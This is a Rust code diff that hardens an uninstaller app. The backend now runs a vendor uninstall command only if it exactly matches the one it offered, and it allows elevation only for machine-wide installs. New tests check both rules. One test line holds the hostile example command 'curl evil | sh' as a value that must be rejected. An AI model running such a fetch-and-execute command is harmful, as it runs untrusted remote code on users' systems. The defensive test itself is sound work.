@@ -54,11 +54,13 @@ struct Offered {
     /// The vendor's own uninstaller.
     ///
     /// This one matters most. It is a command line, and it is run through a
-    /// shell — elevated, on Windows. A path arriving that was never offered
-    /// costs one wrong file; a command arriving that was never offered is
-    /// arbitrary code as administrator. It is checked the same way as the
-    /// rest, which until now it was not.
+    /// shell on Windows. A path arriving that was never offered costs one
+    /// wrong file; a command arriving that was never offered is arbitrary
+    /// code, so it is checked against the exact command the backend offered.
     command: Option<String>,
+    /// Only a machine-wide uninstall command from the scanned plan may request
+    /// elevation. This stays server-side so the frontend cannot change it.
+    elevate_command: bool,
 }
 
 /// Whether an item is one this app actually offered.
@@ -133,6 +135,8 @@ impl Cache {
         offered.paths.clear();
         offered.keys.clear();
         offered.command = plan.delegated_command.clone();
+        offered.elevate_command = plan.delegated_command.is_some()
+            && plan.app.as_ref().is_some_and(InstalledApp::is_machine_wide);
         for item in &plan.items {
             offered.paths.insert(item.path.clone());
             if let Some(key) = &item.registry_key {
@@ -227,15 +231,23 @@ fn execute_plan(plan: RemovalPlan, force: bool, cache: State<Cache>) -> RemovalR
     // Nothing is removed, and nothing is run, that this app did not itself put
     // in front of the user.
     let mut plan = plan;
-    let (paths, keys, command) = {
+    let (paths, keys, command, elevate_command) = {
         let o = cache.offered.lock().unwrap();
-        (o.paths.clone(), o.keys.clone(), o.command.clone())
+        (
+            o.paths.clone(),
+            o.keys.clone(),
+            o.command.clone(),
+            o.elevate_command,
+        )
     };
 
     // A command line is the most dangerous thing a plan can carry, so it is
     // dropped outright unless it is the one that was offered.
     if plan.delegated_command.is_some() && plan.delegated_command != command {
         plan.delegated_command = None;
+    }
+    if let Some(app) = &mut plan.app {
+        app.scope = elevate_command.then(|| "All users".to_string());
     }
 
     let mut refused: Vec<RemovalOutcome> = Vec::new();
@@ -703,6 +715,28 @@ mod tests {
     use super::*;
     use bhu_core::model::{Confidence, LeftoverKind};
 
+    fn app(scope: Option<&str>) -> InstalledApp {
+        InstalledApp {
+            id: "example".into(),
+            name: "Example".into(),
+            path: None,
+            bundle_id: None,
+            executable: None,
+            version: None,
+            publisher: None,
+            size_bytes: 0,
+            source: AppSource::WindowsRegistry,
+            icon_png_base64: None,
+            created_at: None,
+            modified_at: None,
+            last_opened_at: None,
+            notarized: None,
+            is_running: false,
+            is_system: false,
+            scope: scope.map(str::to_string),
+        }
+    }
+
     fn item(path: &str, key: Option<&str>) -> RemovalItem {
         RemovalItem {
             path: PathBuf::from(path),
@@ -780,5 +814,19 @@ mod tests {
         assert_eq!(o.command.as_deref(), Some("\"C:\\Foo\\unins000.exe\" /S"));
         // Anything else the interface might send is not this, so it is dropped.
         assert_ne!(o.command.as_deref(), Some("curl evil | sh"));
+    }
+
+    #[test]
+    fn only_a_machine_wide_offered_command_can_request_elevation() {
+        for (scope, expected) in [(Some("You"), false), (Some("All users"), true)] {
+            let plan = RemovalPlan {
+                app: Some(app(scope)),
+                items: vec![],
+                delegated_command: Some("\"C:\\Foo\\unins000.exe\" /S".into()),
+            };
+            let cache = Cache::default();
+            cache.offer(&plan);
+            assert_eq!(cache.offered.lock().unwrap().elevate_command, expected);
+        }
     }
 }
